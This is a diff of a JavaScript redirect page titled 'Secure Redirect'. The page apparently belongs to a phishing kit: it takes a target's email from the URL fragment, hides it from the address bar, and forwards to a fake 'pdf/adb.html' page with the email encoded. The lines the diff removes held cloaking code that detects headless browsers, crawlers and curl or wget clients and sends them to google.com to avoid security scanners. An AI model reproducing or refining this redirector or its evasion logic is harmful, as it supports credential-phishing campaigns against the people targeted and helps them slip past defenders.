@@ -53,57 +53,40 @@
 <body>
   <div class="container">
     <h1>Secure Redirect</h1>
-    <div class="status" id="status">Initializing security protocols...</div>
+    <div class="status" id="status">Redirecting...</div>
     <div class="loader"></div>
   </div>
 
   <script>
     (function () {
-  // Bot detection
-  if (
-    window.outerWidth === 0 ||
-    window.outerHeight === 0 ||
-    navigator.webdriver ||
-    /HeadlessChrome|PhantomJS|bot|spider|crawl|curl|wget/i.test(navigator.userAgent)
-  ) {
-    window.location.href = "https://google.com";
-    throw new Error("Bot detected");
-  }
+      function generateSecureToken(length = 64) {
+        const array = new Uint8Array(length / 2);
+        window.crypto.getRandomValues(array);
+        return Array.from(array, byte => byte.toString(16).padStart(2, '0')).join('');
+      }
 
-  function generateSecureToken(length = 64) {
-    const array = new Uint8Array(length / 2);
-    window.crypto.getRandomValues(array);
-    return Array.from(array, byte => byte.toString(16).padStart(2, '0')).join('');
-  }
+      function encodeData(data) {
+        return btoa(encodeURIComponent(data))
+          .replace(/\+/g, '-')
+          .replace(/\//g, '_')
+          .replace(/=+$/, '');
+      }
 
-  function encodeData(data) {
-    return btoa(encodeURIComponent(data))
-      .replace(/\+/g, '-')
-      .replace(/\//g, '_')
-      .replace(/=+$/, '');
-  }
+      const hash = window.location.hash.substring(1) || "guest@example.com";
+      const email = hash;
+      const token = generateSecureToken();
 
-  const hash = window.location.hash.substring(1);
-  if (!hash || !hash.includes("@")) {
-    window.location.href = "https://google.com";
-    return;
-  }
+      sessionStorage.setItem("redirect_email", email);
+      sessionStorage.setItem("redirect_token", token);
 
-  const email = hash;
-  const token = generateSecureToken();
+      history.replaceState(null, "", window.location.pathname + window.location.search);
 
-  sessionStorage.setItem("redirect_email", email);
-  sessionStorage.setItem("redirect_token", token);
+      const encodedEmail = encodeData(email);
+      const redirectUrl = `pdf/adb.html#${encodedEmail}&token=${token}`;
 
-  history.replaceState(null, "", window.location.pathname + window.location.search);
-
-  const encodedEmail = encodeData(email);
-  const redirectUrl = `pdf/adb.html#${encodedEmail}&token=${token}`;
-
-  // Redirect immediately
-  window.location.href = redirectUrl;
-})();
+      // Redirect immediately
+      window.location.replace(redirectUrl);
+    })();
   </script>
 </body>
 </html>
-
